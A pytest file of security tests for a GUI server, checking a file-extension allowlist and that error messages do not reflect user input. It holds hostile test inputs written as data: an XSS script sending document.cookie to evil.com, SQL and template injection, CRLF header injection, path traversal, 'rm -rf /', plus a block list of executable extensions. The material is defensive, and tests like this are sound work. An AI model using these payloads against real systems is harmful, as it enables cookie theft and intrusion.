"""
Intensive security tests for the GUI layer (react_server.py).

Covers:
1. _open_local_path  — extension allowlist (code-execution prevention)
2. _resolve_gui_open_target — no reflected target in error messages (XSS prevention)
"""
from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi import HTTPException

from arignan.gui.react_server import (
    _SAFE_OPEN_EXTENSIONS,
    _open_local_path,
    _resolve_gui_open_target,
)


# ---------------------------------------------------------------------------
# _open_local_path — extension allowlist
# ---------------------------------------------------------------------------


class TestOpenLocalPathExtensionAllowlist:
    """_open_local_path must refuse to open any file whose extension is not in
    the explicit safelist.  This prevents os.startfile / xdg-open from
    executing scripts, binaries, or URL shortcuts."""

    # --- safe extensions must be accepted ---

    @pytest.mark.parametrize("ext", sorted(_SAFE_OPEN_EXTENSIONS))
    def test_safe_extension_calls_opener(self, tmp_path: Path, ext: str, monkeypatch) -> None:
        target = tmp_path / f"file{ext}"
        target.write_text("content")
        opened: list[Path] = []

        if sys.platform == "darwin":
            monkeypatch.setattr(
                "arignan.gui.react_server.subprocess.run",
                lambda cmd, **kw: opened.append(Path(cmd[-1])) or MagicMock(returncode=0),
            )
        else:
            monkeypatch.setattr("os.name", "posix")
            monkeypatch.setattr(
                "arignan.gui.react_server.subprocess.run",
                lambda cmd, **kw: opened.append(Path(cmd[-1])) or MagicMock(returncode=0),
            )

        _open_local_path(target)  # must not raise

    # --- dangerous extensions must be blocked ---

    @pytest.mark.parametrize("dangerous_ext", [
        ".exe", ".bat", ".cmd", ".sh", ".command",
        ".app", ".url", ".lnk", ".ps1", ".vbs",
        ".py",   # scripts that could exec arbitrary code
        ".bin",
        ".dmg",
        ".pkg",
        ".msi",
    ])
    def test_dangerous_extension_raises_value_error(
        self, tmp_path: Path, dangerous_ext: str
    ) -> None:
        target = tmp_path / f"malicious{dangerous_ext}"
        target.write_text("payload")
        with pytest.raises(ValueError, match="not in the allowed list"):
            _open_local_path(target)

    def test_no_extension_is_rejected(self, tmp_path: Path) -> None:
        target = tmp_path / "noextension"
        target.write_text("payload")
        with pytest.raises(ValueError, match="not in the allowed list"):
            _open_local_path(target)

    def test_double_extension_only_checks_last_suffix(self, tmp_path: Path) -> None:
        # "file.json.exe" — the last suffix is .exe → must be rejected
        target = tmp_path / "file.json.exe"
        target.write_text("payload")
        with pytest.raises(ValueError, match="not in the allowed list"):
            _open_local_path(target)

    def test_uppercase_extension_is_blocked(self, tmp_path: Path) -> None:
        # Extension check must be case-insensitive
        target = tmp_path / "MALICIOUS.SH"
        target.write_text("#!/bin/sh\nrm -rf /")
        with pytest.raises(ValueError, match="not in the allowed list"):
            _open_local_path(target)

    def test_safe_extension_uppercase_is_accepted(self, tmp_path: Path, monkeypatch) -> None:
        target = tmp_path / "CONFIG.JSON"
        target.write_text("{}")
        monkeypatch.setattr(
            "arignan.gui.react_server.subprocess.run",
            lambda cmd, **kw: MagicMock(returncode=0),
        )
        _open_local_path(target)  # must not raise

    def test_hidden_file_with_dangerous_extension_blocked(self, tmp_path: Path) -> None:
        target = tmp_path / ".hidden.sh"
        target.write_text("#!/bin/sh\necho owned")
        with pytest.raises(ValueError, match="not in the allowed list"):
            _open_local_path(target)

    def test_path_traversal_segment_does_not_bypass_check(self, tmp_path: Path) -> None:
        # The check is on the final .suffix, traversal components are irrelevant
        dangerous = tmp_path / "../../evil.sh"
        # We test the check itself, not filesystem traversal
        with pytest.raises(ValueError, match="not in the allowed list"):
            _open_local_path(dangerous)


# ---------------------------------------------------------------------------
# _resolve_gui_open_target — reflected target in error (XSS prevention)
# ---------------------------------------------------------------------------


def _make_mock_app(tmp_path: Path):
    """Build a minimal mock ArignanApp that satisfies _resolve_gui_open_target."""
    app = MagicMock()
    app.config.app_home = tmp_path
    app.session_manager.store.active_exception_log_path.return_value = (
        tmp_path / "sessions" / "active" / "gui" / "exceptions.log"
    )
    app.terminal_pid = None
    return app


class TestResolveGuiOpenTargetXSSPrevention:
    def test_unknown_target_raises_http_404(self, tmp_path: Path) -> None:
        app = _make_mock_app(tmp_path)
        with pytest.raises(HTTPException) as exc_info:
            _resolve_gui_open_target(app, "unknown-target")
        assert exc_info.value.status_code == 404

    def test_error_detail_does_not_echo_target_value(self, tmp_path: Path) -> None:
        app = _make_mock_app(tmp_path)
        xss_payload = "<img src=x onerror=alert(document.cookie)>"
        with pytest.raises(HTTPException) as exc_info:
            _resolve_gui_open_target(app, xss_payload)
        assert xss_payload not in str(exc_info.value.detail)

    def test_error_detail_does_not_echo_any_user_input(self, tmp_path: Path) -> None:
        app = _make_mock_app(tmp_path)
        for malicious_target in [
            "'; DROP TABLE hats;--",
            "../../../etc/passwd",
            "${7*7}",
            "{{7*7}}",
            "%0d%0aSet-Cookie: session=hijacked",
            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
        ]:
            with pytest.raises(HTTPException) as exc_info:
                _resolve_gui_open_target(app, malicious_target)
            detail = str(exc_info.value.detail)
            assert malicious_target not in detail, (
                f"Target '{malicious_target}' was reflected in the error detail: {detail!r}"
            )

    def test_known_targets_do_not_raise(self, tmp_path: Path) -> None:
        app = _make_mock_app(tmp_path)
        for known in ("settings", "prompts", "logs"):
            path = _resolve_gui_open_target(app, known)
            assert isinstance(path, Path)

    def test_partial_match_does_not_trigger_known_target(self, tmp_path: Path) -> None:
        app = _make_mock_app(tmp_path)
        # "settings_extra" is NOT a valid target (only exact "settings" is)
        with pytest.raises(HTTPException) as exc_info:
            _resolve_gui_open_target(app, "settings_extra")
        assert exc_info.value.status_code == 404
        assert "settings_extra" not in str(exc_info.value.detail)


# ---------------------------------------------------------------------------
# _SAFE_OPEN_EXTENSIONS — content assertions
# ---------------------------------------------------------------------------


class TestSafeOpenExtensionsSet:
    def test_contains_expected_text_formats(self) -> None:
        for ext in (".json", ".md", ".txt", ".log", ".yaml", ".yml", ".toml"):
            assert ext in _SAFE_OPEN_EXTENSIONS, f"{ext} should be in _SAFE_OPEN_EXTENSIONS"

    def test_does_not_contain_executables(self) -> None:
        for dangerous in (".exe", ".sh", ".bat", ".cmd", ".app", ".url", ".lnk", ".py"):
            assert dangerous not in _SAFE_OPEN_EXTENSIONS, (
                f"{dangerous} must NOT be in _SAFE_OPEN_EXTENSIONS"
            )

    def test_all_entries_are_lowercase(self) -> None:
        for ext in _SAFE_OPEN_EXTENSIONS:
            assert ext == ext.lower(), f"Extension '{ext}' must be lowercase"

    def test_all_entries_start_with_dot(self) -> None:
        for ext in _SAFE_OPEN_EXTENSIONS:
            assert ext.startswith("."), f"Extension '{ext}' must start with '.'"
